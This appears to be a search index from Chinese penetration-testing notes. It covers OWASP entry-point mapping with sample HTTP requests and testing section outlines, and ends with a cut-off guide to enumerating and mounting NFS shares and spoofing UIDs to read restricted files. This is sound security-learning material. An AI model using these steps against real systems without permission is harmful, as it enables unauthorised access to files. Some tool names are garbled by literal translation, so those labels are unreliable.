\u8f93\u51fa\u6587\u4ef6\uff0c\u63d2\u4ef6\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e ZAP \u548c Burp Suite\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u94fe\u63a5\u3002</p> <ul> <li>OWASP ZAP \u7684 ASD \u63d2\u4ef6\u4e3b\u9875</li> <li>PortSwigger Burp \u7684 ASD \u63d2\u4ef6\u4e3b\u9875</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_7","title":"\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9","text":"<p>\u4ee5\u4e0b\u662f\u6709\u5173\u5982\u4f55\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9\u7684\u4e24\u4e2a\u793a\u4f8b\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#1","title":"\u793a\u4f8b 1","text":"<p>\u6b64\u793a\u4f8b\u663e\u793a\u4e86\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u8be5\u8bf7\u6c42\u5c06\u4ece\u5728\u7ebf\u8d2d\u7269\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8d2d\u4e70\u5546\u54c1\u3002</p> <pre><code>GET\u00a0/shoppingApp/buyme.asp?CUSTOMERID=100&amp;ITEM=z101a&amp;PRICE=62.50&amp;IP=x.x.x.x HTTP/1.1\nHost:\u00a0x.x.x.x\nCookie:\u00a0SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy\n</code></pre> <p>\u8bf7\u6c42\u7684\u6240\u6709\u53c2\u6570\uff0c\u5982 CUSTOMERID\u3001ITEM\u3001PRICE\u3001IP \u548c Cookie\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u53ea\u662f\u7f16\u7801\u53c2\u6570\u6216\u7528\u4e8e\u4f1a\u8bdd\u72b6\u6001\u7684\u53c2\u6570\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#2","title":"\u793a\u4f8b 2","text":"<p>\u6b64\u793a\u4f8b\u663e\u793a\u4e86\u4e00\u4e2a POST \u8bf7\u6c42\uff0c\u8be5\u8bf7\u6c42\u5c06\u4f7f\u60a8\u767b\u5f55\u5230\u5e94\u7528\u7a0b\u5e8f\u3002</p> <pre><code>POST\u00a0/example/authenticate.asp?service=login HTTP/1.1\nHost:\u00a0x.x.x.x\nCookie:\u00a0SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin&amp;pass=pass123&amp;debug=true&amp;fromtrustIP=true\n</code></pre> <p>\u53ef\u4ee5\u6ce8\u610f\u5230\u53c2\u6570\u5728\u51e0\u4e2a\u4f4d\u7f6e\u53d1\u9001\uff1a</p> <ol> <li>\u5728\u67e5\u8be2\u5b57\u7b26\u4e32\u4e2d\uff1a<code>service</code></li> <li>\u5728 Cookie \u6807\u5934\u4e2d\uff1a<code>SESSIONID</code>,<code>CustomCookie</code></li> <li>\u5728\u8bf7\u6c42\u6b63\u6587\u4e2d\uff1a<code>user</code>,\u00a0<code>pass</code>,\u00a0<code>debug</code>,<code>fromtrustIP</code></li> </ol> <p>\u62e5\u6709\u5404\u79cd\u6ce8\u5165\u4f4d\u7f6e\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u4e86\u94fe\u63a5\u7684\u53ef\u80fd\u6027\uff0c\u53ef\u4ee5\u63d0\u9ad8\u5728\u5904\u7406\u4ee3\u7801\u4e2d\u53d1\u73b0\u9519\u8bef\u7684\u673a\u4f1a\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_8","title":"\u5de5\u5177","text":"<ul> <li>OWASP Zed \u653b\u51fb\u4ee3\u7406 (ZAP)</li> <li>\u6253\u55dd\u5957\u623f</li> <li>\u63d0\u7434\u624b</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_9","title":"\u53c2\u8003","text":"<ul> <li>RFC 2616 \u2013 \u8d85\u6587\u672c\u4f20\u8f93\u200b\u200b\u534f\u8bae \u2013 HTTP 1.1</li> <li>OWASP \u653b\u51fb\u9762\u68c0\u6d4b\u5668</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/","title":"\u8ba4\u8bc1\u6d4b\u8bd5","text":"<p>4.4.1\u6d4b\u8bd5\u901a\u8fc7\u52a0\u5bc6\u901a\u9053\u4f20\u8f93\u7684\u51ed\u8bc1</p> <p>4.4.2\u6d4b\u8bd5\u9ed8\u8ba4\u51ed\u8bc1</p> <p>4.4.3\u5f31\u9501\u673a\u5236\u6d4b\u8bd5</p> <p>4.4.4\u6d4b\u8bd5\u7ed5\u8fc7\u8ba4\u8bc1\u6a21\u5f0f</p> <p>4.4.5\u6d4b\u8bd5\u8bb0\u4f4f\u5bc6\u7801\u6f0f\u6d1e</p> <p>4.4.6\u6d4b\u8bd5\u6d4f\u89c8\u5668\u7f13\u5b58\u5f31\u70b9</p> <p>4.4.7\u5f31\u53e3\u4ee4\u7b56\u7565\u6d4b\u8bd5</p> <p>4.4.8\u5f31\u5b89\u5168\u95ee\u9898\u7b54\u6848\u6d4b\u8bd5</p> <p>4.4.9\u6d4b\u8bd5\u5f31\u5bc6\u7801\u66f4\u6539\u6216\u91cd\u7f6e\u529f\u80fd</p> <p>4.4.10\u5728\u66ff\u4ee3\u901a\u9053\u4e2d\u6d4b\u8bd5\u8f83\u5f31\u7684\u8ba4\u8bc1</p> <p>4.4.11\u6d4b\u8bd5\u591a\u91cd\u8eab\u4efd\u9a8c\u8bc1</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.3.1\u6d4b\u8bd5\u89d2\u8272\u5b9a\u4e49</p> <p>4.3.2\u6d4b\u8bd5\u7528\u6237\u6ce8\u518c\u6d41\u7a0b</p> <p>4.3.3\u6d4b\u8bd5\u8d26\u53f7\u5f00\u901a\u6d41\u7a0b</p> <p>4.3.4\u8d26\u53f7\u679a\u4e3e\u548c\u53ef\u731c\u6d4b\u7528\u6237\u8d26\u53f7\u6d4b\u8bd5</p> <p>4.3.5\u6d4b\u8bd5\u5f31\u7528\u6237\u540d\u7b56\u7565\u6216\u672a\u5f3a\u5236\u6267\u884c\u7684\u7528\u6237\u540d\u7b56\u7565</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/","title":"\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5","text":"<p>4.7.1\u53cd\u5c04\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5</p> <p>4.7.2\u6d4b\u8bd5\u5b58\u50a8\u7684\u8de8\u7ad9\u811a\u672c</p> <p>4.7.3\u6d4b\u8bd5 HTTP \u52a8\u8bcd\u7be1\u6539</p> <p>4.7.4\u00a0HTTP\u53c2\u6570\u6c61\u67d3\u6d4b\u8bd5</p> <p>4.7.5\u00a0SQL \u6ce8\u5165\u6d4b\u8bd5</p> <ul> <li> <p>4.7.5.1\u00a0Oracle \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.2\u00a0MySQL \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.3\u00a0SQL Server \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.4\u6d4b\u8bd5 PostgreSQL</p> </li> <li> <p>4.7.5.5\u6d4b\u8bd5 MS Access</p> </li> <li> <p>4.7.5.6\u00a0NoSQL\u6ce8\u5165\u6d4b\u8bd5</p> </li> <li> <p>4.7.5.7\u00a0ORM\u6ce8\u5165\u6d4b\u8bd5</p> </li> <li> <p>4.7.5.8\u5ba2\u6237\u7aef\u6d4b\u8bd5</p> </li> </ul> <p>4.7.6\u6d4b\u8bd5 LDAP \u6ce8\u5165</p> <p>4.7.7\u00a0XML \u6ce8\u5165\u6d4b\u8bd5 https://tttang.com/archive/1813/#toc_xml</p> <p>4.7.8\u00a0SSI \u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.9\u00a0XPath \u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.10\u00a0IMAP SMTP \u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.11\u4ee3\u7801\u6ce8\u5165\u6d4b\u8bd5</p> <ul> <li>4.7.11.1\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5</li> </ul> <p>4.7.12\u547d\u4ee4\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.14\u5b75\u5316\u6f0f\u6d1e\u6d4b\u8bd5</p> <p>4.7.15\u00a0HTTP \u62c6\u5206\u8d70\u79c1\u6d4b\u8bd5</p> <p>4.7.16\u6d4b\u8bd5 HTTP \u4f20\u5165\u8bf7\u6c42</p> <p>4.7.17\u4e3b\u673a\u5934\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.18\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.7.19\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\u6d4b\u8bd5</p> <p>4.7.20\u6279\u91cf\u5206\u914d\u6d4b\u8bd5</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/","title":"\u901a\u8fc7\u5e94\u7528\u6620\u5c04\u6267\u884c\u8def\u5f84","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_1","title":"\u6982\u62ec","text":"<p>\u5728\u5f00\u59cb\u5b89\u5168\u6d4b\u8bd5\u4e4b\u524d\uff0c\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u7ed3\u6784\u81f3\u5173\u91cd\u8981\u3002\u5982\u679c\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u5e03\u5c40\u6ca1\u6709\u900f\u5f7b\u7684\u4e86\u89e3\uff0c\u5c31\u4e0d\u53ef\u80fd\u5bf9\u5176\u8fdb\u884c\u5f7b\u5e95\u7684\u6d4b\u8bd5\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u6620\u5c04\u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e86\u89e3\u4e3b\u8981\u5de5\u4f5c\u6d41\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u5728\u9ed1\u76d2\u6d4b\u8bd5\u4e2d\uff0c\u6d4b\u8bd5\u6574\u4e2a\u4ee3\u7801\u5e93\u662f\u6781\u5176\u56f0\u96be\u7684\u3002\u4e0d\u4ec5\u4ec5\u662f\u56e0\u4e3a\u6d4b\u8bd5\u4eba\u5458\u770b\u4e0d\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u8def\u5f84\uff0c\u800c\u4e14\u5373\u4f7f\u4ed6\u4eec\u770b\u5230\u4e86\uff0c\u6d4b\u8bd5\u6240\u6709\u4ee3\u7801\u8def\u5f84\u4e5f\u4f1a\u975e\u5e38\u8017\u65f6\u3002\u534f\u8c03\u8fd9\u4e00\u70b9\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u8bb0\u5f55\u53d1\u73b0\u548c\u6d4b\u8bd5\u7684\u4ee3\u7801\u8def\u5f84\u3002</p> <p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6d4b\u8bd5\u548c\u6d4b\u91cf\u4ee3\u7801\u8986\u76d6\u7387\uff1a</p> <ul> <li>PATH -  \u6d4b\u8bd5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u6761\u8def\u5f84\uff0c\u5305\u62ec\u9488\u5bf9\u6bcf\u6761\u51b3\u7b56\u8def\u5f84\u7684\u7ec4\u5408\u548c\u8fb9\u754c\u503c\u5206\u6790\u6d4b\u8bd5\u3002\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u63d0\u4f9b\u4e86\u5f7b\u5e95\u6027\uff0c\u4f46\u53ef\u6d4b\u8bd5\u8def\u5f84\u7684\u6570\u91cf\u968f\u7740\u6bcf\u4e2a\u51b3\u7b56\u5206\u652f\u5448\u6307\u6570\u589e\u957f\u3002</li> <li>Data Flow (or Taint Analysis)\u00a0- \u901a\u8fc7\u5916\u90e8\u4ea4\u4e92\uff08\u901a\u5e38\u662f\u7528\u6237\uff09\u6d4b\u8bd5\u53d8\u91cf\u7684\u5206\u914d\u3002\u4e13\u6ce8\u4e8e\u6620\u5c04\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6570\u636e\u7684\u6d41\u52a8\u3001\u8f6c\u6362\u548c\u4f7f\u7528\u3002</li> <li>Race\u00a0- \u6d4b\u8bd5\u5904\u7406\u76f8\u540c\u6570\u636e\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u591a\u4e2a\u5e76\u53d1\u5b9e\u4f8b\u3002</li> </ul> <p>\u5e94\u4e0e\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u534f\u5546\u6743\u8861\u4f7f\u7528\u4f55\u79cd\u65b9\u6cd5\u4ee5\u53ca\u6bcf\u79cd\u65b9\u6cd5\u7684\u4f7f\u7528\u7a0b\u5ea6\u3002\u4e5f\u53ef\u4ee5\u91c7\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u8be2\u95ee\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u4ed6\u4eec\u7279\u522b\u5173\u6ce8\u54ea\u4e9b\u529f\u80fd\u6216\u4ee3\u7801\u6bb5\u4ee5\u53ca\u5982\u4f55\u5230\u8fbe\u8fd9\u4e9b\u4ee3\u7801\u6bb5\u3002</p> <p>\u4e3a\u4e86\u5411\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u5c55\u793a\u4ee3\u7801\u8986\u76d6\u7387\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4ece\u7535\u5b50\u8868\u683c\u5f00\u59cb\u5e76\u8bb0\u5f55\u901a\u8fc7\u722c\u53d6\u5e94\u7528\u7a0b\u5e8f\uff08\u624b\u52a8\u6216\u81ea\u52a8\uff09\u53d1\u73b0\u7684\u6240\u6709\u94fe\u63a5\u3002\u7136\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u66f4\u4ed4\u7ec6\u5730\u67e5\u770b\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u51b3\u7b56\u70b9\uff0c\u5e76\u8c03\u67e5\u53d1\u73b0\u4e86\u591a\u5c11\u91cd\u8981\u7684\u4ee3\u7801\u8def\u5f84\u3002\u7136\u540e\u5e94\u5c06\u8fd9\u4e9b\u8bb0\u5f55\u5728\u7535\u5b50\u8868\u683c\u4e2d\uff0c\u5176\u4e2d\u5305\u542b\u6240\u53d1\u73b0\u8def\u5f84\u7684 URL\u3001\u6563\u6587\u548c\u5c4f\u5e55\u622a\u56fe\u63cf\u8ff0\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_4","title":"\u81ea\u52a8\u6293\u53d6","text":"<p>\u81ea\u52a8\u8718\u86db\u662f\u4e00\u79cd\u7528\u4e8e\u81ea\u52a8\u53d1\u73b0\u7279\u5b9a\u7f51\u7ad9\u4e0a\u7684\u65b0\u8d44\u6e90\uff08URL\uff09\u7684\u5de5\u5177\u3002\u5b83\u4ee5\u8981\u8bbf\u95ee\u7684 URL \u5217\u8868\u5f00\u59cb\uff0c\u79f0\u4e3a\u79cd\u5b50\uff0c\u8fd9\u53d6\u51b3\u4e8e Spider \u7684\u542f\u52a8\u65b9\u5f0f\u3002\u867d\u7136\u6709\u5f88\u591a Spidering \u5de5\u5177\uff0c\u4f46\u4ee5\u4e0b\u793a\u4f8b\u4f7f\u7528Zed Attack Proxy (ZAP)\uff1a</p> <p> \u56fe 4.1.7-1\uff1aZed \u653b\u51fb\u4ee3\u7406\u5c4f\u5e55</p> <p>ZAP\u63d0\u4f9b\u5404\u79cd\u81ea\u52a8\u722c\u53d6\u9009\u9879\uff0c\u53ef\u4ee5\u6839\u636e\u6d4b\u8bd5\u4eba\u5458\u7684\u9700\u8981\u52a0\u4ee5\u5229\u7528\uff1a</p> <ul> <li>\u8718\u86db</li> <li>AJAX\u8718\u86db</li> <li>OpenAPI \u652f\u6301</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_5","title":"\u5de5\u5177","text":"<ul> <li>Zed \u653b\u51fb\u4ee3\u7406 (ZAP)</li> <li>\u7535\u5b50\u8868\u683c\u8f6f\u4ef6\u5217\u8868</li> <li>\u7ed8\u56fe\u8f6f\u4ef6</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%80%9A%E8%BF%87%E5%BA%94%E7%94%A8%E6%98%A0%E5%B0%84%E6%89%A7%E8%A1%8C%E8%B7%AF%E5%BE%84/#_6","title":"\u53c2\u8003","text":"<ul> <li>\u4ee3\u7801\u8986\u76d6\u7387</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"\u914d\u7f6e\u90e8\u7f72\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.2.1\u6d4b\u8bd5\u7f51\u7edc\u57fa\u7840\u8bbe\u65bd\u914d\u7f6e</p> <p>4.2.2\u6d4b\u8bd5\u5e94\u7528\u5e73\u53f0\u914d\u7f6e</p> <p>4.2.3\u654f\u611f\u4fe1\u606f\u6d4b\u8bd5\u6587\u4ef6\u6269\u5c55\u540d\u5904\u7406</p> <p>4.2.4\u67e5\u770b\u65e7\u5907\u4efd\u548c\u672a\u5f15\u7528\u7684\u654f\u611f\u4fe1\u606f\u6587\u4ef6</p> <p>4.2.5\u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7ba1\u7406\u754c\u9762</p> <p>4.2.6\u6d4b\u8bd5 HTTP \u65b9\u6cd5</p> <p>4.2.7\u6d4b\u8bd5 HTTP \u4e25\u683c\u4f20\u8f93\u5b89\u5168</p> <p>4.2.8\u6d4b\u8bd5 RIA \u8de8\u57df\u7b56\u7565</p> <p>4.2.9\u6d4b\u8bd5\u6587\u4ef6\u6743\u9650</p> <p>4.2.10\u5b50\u57df\u63a5\u7ba1\u6d4b\u8bd5</p> <p>4.2.11\u6d4b\u8bd5\u4e91\u5b58\u50a8</p> <p>4.2.12\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u6d4b\u8bd5</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%B5%8B%E8%AF%95/","title":"\u9519\u8bef\u5904\u7406\u6d4b\u8bd5","text":"<p>\u9519\u8bef\u5904\u7406\u4e0d\u5f53\u6d4b\u8bd5</p> <p>4.8.2\u5806\u6808\u8ddf\u8e2a\u6d4b\u8bd5</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/","title":"2049   Pentesting NFS Service","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#basic-information","title":"Basic Information","text":"<p>\u5b83\u662f\u4e00\u4e2a\u5ba2\u6237\u7aef/\u670d\u52a1\u5668\u7cfb\u7edf\uff0c\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u6587\u4ef6\u5e76\u5c06\u5b83\u4eec\u5f53\u4f5c\u9a7b\u7559\u5728\u672c\u5730\u6587\u4ef6\u76ee\u5f55\u4e2d\u4e00\u6837\u5bf9\u5f85\u3002</p> <p>\u4e0e SMB \u5177\u6709\u76f8\u540c\u7684\u7528\u9014\uff0c\u4f46\u4e0d\u80fd\u4e0e SMB \u901a\u4fe1\u3002 </p> <p>NFS \u534f\u8bae\u6ca1\u6709\u8eab\u4efd\u9a8c\u8bc1\u6216\u6388\u6743\u673a\u5236\u3002\u6388\u6743\u53d6\u81ea\u6587\u4ef6\u7cfb\u7edf\u7684\u53ef\u7528\u4fe1\u606f\uff0c\u670d\u52a1\u5668\u8d1f\u8d23\u5c06\u5ba2\u6237\u7aef\u63d0\u4f9b\u7684\u7528\u6237\u4fe1\u606f\u7ffb\u8bd1\u6210\u6587\u4ef6\u7cfb\u7edf\u7684\u7528\u6237\u4fe1\u606f\uff0c\u5e76\u5c3d\u53ef\u80fd\u6b63\u786e\u5730\u5c06\u76f8\u5e94\u7684\u6388\u6743\u4fe1\u606f\u8f6c\u6362\u6210UNIX\u8981\u6c42\u7684\u8bed\u6cd5\u3002 </p> <p>\u6700\u5e38\u89c1\u7684\u8eab\u4efd\u9a8c\u8bc1\u662f\u901a\u8fc7 UNIX UID/GID \u548c\u7ec4\u6210\u5458\u8eab\u4efd\u8fdb\u884c\u7684\uff0c\u8fd9\u5c31\u662f\u6b64\u8bed\u6cd5\u6700\u6709\u53ef\u80fd\u5e94\u7528\u4e8e NFS \u534f\u8bae\u7684\u539f\u56e0\u3002</p> <p>\u4e00\u4e2a\u95ee\u9898\u662f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e0d\u4e00\u5b9a\u5fc5\u987b\u5177\u6709\u76f8\u540c\u7684 UID/GID \u5230\u7528\u6237\u548c\u7ec4\u7684\u6620\u5c04\u3002\u670d\u52a1\u5668\u7aef\u65e0\u6cd5\u8fdb\u884c\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48 NFS \u53ea\u5e94\u5728\u53d7\u4fe1\u4efb\u7684\u7f51\u7edc\u4e2d\u4e0e\u6b64\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\u4e00\u8d77\u4f7f\u7528\u3002 </p> <p>\u9ed8\u8ba4\u7aef\u53e3\uff1a2049/TCP/UDP\uff08\u7248\u672c4\u9664\u5916\uff0c\u5b83\u53ea\u9700\u8981TCP\u6216UDP\uff09\u3002</p> <pre><code>2049/tcp open nfs 2-3 (RPC #100003\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#version","title":"Version","text":"<p>(From https://academy.hackthebox.com/module/112/section/1068) ![[Pasted image 20221119161928.png]]</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#enumeration","title":"Enumeration","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#useful-nmap-scripts","title":"Useful nmap scripts","text":"<pre><code>nfs-ls #List NFS exports and check permissions\n\nnfs-showmount #Like showmount -e\n\nnfs-statfs #Disk statistics and info from NFS share\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#useful-metasploit-moudles","title":"Useful metasploit moudles","text":"<pre><code>scanner/nfs/nfsmount #Scan NFS mounts and list permissions\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#mounting","title":"Mounting","text":"<p>\u67e5\u8be2\u54ea\u4e2a\u6587\u4ef6\u5939\u53ef\u4ee5\u6302\u8f7d\u5230\u670d\u52a1\u5668</p> <pre><code>showmount -e &lt;IP&gt;\n</code></pre> <p>\u4e4b\u540e\u9009\u62e9\u6302\u8f7d</p> <pre><code>mount -t nfs [-o vers=2] &lt;ip&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock\n</code></pre> <p>\u5e94\u8be5\u6307\u5b9a 2 \u7248\u672c\uff0c\u6ca1\u6709\u8ba4\u8bc1\u673a\u5236</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#example","title":"Example","text":"<pre><code>mkdir /mnt/new_back\n\nmount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#permissions","title":"Permissions","text":"<p>\u5982\u679c\u6302\u8f7d\u7684\u6587\u4ef6\u5939\u53ea\u80fd\u7531\u7279\u5b9a uid \u7528\u6237\u8bbf\u95ee\uff0c\u5219\u53ef\u4ee5\u5728\u672c\u5730\u521b\u5efa\u8be5 uid \u7684\u7528\u6237\u8fdb\u884c\u8bbf\u95ee\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#nsfshell","title":"NSFShell","text":"<p>nfsshell. Nice NFSShell tutorial. \u4f7f\u7528 shell \u5feb\u6377\u64cd\u4f5c</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#_1","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>/etc/exports\n\n/etc/lib/nfs/etab\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#dangerous-setting","title":"Dangerous(\u5371\u9669) Setting","text":"<p>(From https://academy.hackthebox.com/module/112/section/1068) ![[Pasted image 